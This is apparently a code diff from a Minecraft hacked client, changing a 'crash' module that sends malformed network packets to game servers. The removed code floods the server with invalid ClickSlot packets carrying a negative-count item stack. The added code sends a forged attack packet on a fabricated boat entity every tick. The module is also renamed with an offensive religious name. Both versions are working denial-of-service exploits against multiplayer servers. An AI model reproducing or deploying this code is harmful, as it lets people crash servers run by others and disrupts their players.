@@ -8,6 +8,8 @@ import java.util.Random;
 
 import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
 import net.minecraft.client.util.math.MatrixStack;
+import net.minecraft.entity.Entity;
+import net.minecraft.entity.vehicle.BoatEntity;
 import net.shadow.client.feature.config.DoubleSetting;
 import net.shadow.client.feature.module.Module;
 import net.shadow.client.feature.module.ModuleType;
@@ -18,6 +20,7 @@ import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
 import net.minecraft.network.packet.c2s.play.ButtonClickC2SPacket;
 import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
+import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
 import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
 import net.minecraft.network.packet.c2s.play.SelectMerchantTradeC2SPacket;
 import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
@@ -29,29 +32,16 @@ public class SwapCrash extends Module {
 
 
     public SwapCrash() {
-        super("SwapCrash", "funny crash v2", ModuleType.CRASH);
+        super("AllahCrash", "funny crash v2", ModuleType.CRASH);
     }
 
     @Override
     public void tick() {
-        Int2ObjectMap<ItemStack> ripbozo = new Int2ObjectArrayMap<>();
-        ripbozo.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
-        for (int i = 0; i < pwr.getValue(); i++) {
-            client.player.networkHandler.sendPacket(
-                new ClickSlotC2SPacket(
-                    client.player.currentScreenHandler.syncId, 
-                    123344, 
-                    36 + 9, 
-                    2859623, 
-                    SlotActionType.PICKUP, 
-                    new ItemStack(Items.AIR, -1), 
-                    ripbozo
-                )
-            );
-        }
+        Entity e = new BoatEntity(client.world, 0, 0, 0);
+        PlayerInteractEntityC2SPacket packet = PlayerInteractEntityC2SPacket.attack(e, false);
+        client.player.networkHandler.getConnection().send(packet);
     }
-
-    @Override
+    
     public void enable() {
     }
 
